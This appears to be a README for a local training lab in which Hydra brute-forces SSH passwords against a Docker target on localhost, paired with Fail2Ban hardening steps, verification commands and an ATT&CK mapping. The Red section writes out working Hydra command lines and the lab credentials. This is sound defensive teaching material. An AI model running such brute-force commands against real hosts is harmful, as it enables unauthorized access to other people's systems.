# Hydra 01 - SSH brute-force (local lab)

**Walkthrough:** [▶️ Watch on YouTube](https://youtu.be/-rTCzClzzZQ)  
**Status:** Published  
**Scope:** Local Docker target on `127.0.0.1:2222` only (or adapt to your authorized lab host)

## 1) Scenario

Simulate SSH password brute-force against a controlled local target and observe how speed parameters affect noise and detectability.

This lab is designed to bridge to Blue controls, especially **Fail2Ban**.

## 2) Scope & authorization

- Use only your own machine/lab VM.
- Do not target third-party systems.
- Keep target bound to localhost for training.

## 3) Reproduction (Red)

### Start target

```bash
cd labs/offensive-red/hydra/01-ssh
chmod +x start-lab.sh stop-lab.sh
./start-lab.sh
```

Target defaults:

- Host: `127.0.0.1`
- Port: `2222`
- User: `labuser`
- Password: `labpass`

### Run Hydra

Quick smoke test:

```bash
hydra -l labuser -P words-quick.txt -s 2222 -t 4 -V ssh://127.0.0.1
```

Longer demo (better for video + logs):

```bash
hydra -l labuser -P words-demo.txt -s 2222 -t 1 -W 2 -V -o artifacts/hydra-ssh.txt ssh://127.0.0.1
```

## 4) Remediation (Blue)

Primary defensive reference: [Linux Hardening - Lab05 Fail2Ban](../../../../Linux-Hardening/Lab05-Fail2Ban/)

Recommended protections:

- Fail2Ban `sshd` jail with tuned ban time/findtime/maxretry
- Disable password auth where possible; prefer SSH keys
- Restrict source IPs with firewall rules
- Alert on repeated failed SSH authentication

## 5) Verification

- Confirm Hydra finds credentials only when password auth is enabled.
- Enable/tune Fail2Ban and verify source IP ban behavior.
- Correlate offensive run timeline with SSH logs and Fail2Ban status.

Suggested checks:

```bash
sudo journalctl -u ssh -n 100 --no-pager
sudo fail2ban-client status sshd
```

## 6) Artifacts

- `commands.md` - command reference for recording and validation
- `words-quick.txt`, `words-demo.txt` - wordlists for quick and extended runs
- `artifacts/hydra-ssh.txt` - saved Hydra output

## 7) Defensive takeaway

- Fast brute-force attempts are noisy and easy to alert on.
- Lower attack speed can reduce noise but extends attacker exposure window.
- Fail2Ban plus SSH hardening sharply reduces practical brute-force success.

## 8) MITRE ATT&CK mapping


| ATT&CK Tactic     | Technique ID | Why it matches this lab               | Detection idea                             | Mitigation                      |
| ----------------- | ------------ | ------------------------------------- | ------------------------------------------ | ------------------------------- |
| Credential Access | T1110.001    | Password guessing against SSH service | Monitor failed SSH auth bursts per IP/user | Fail2Ban, SSH keys, source ACLs |


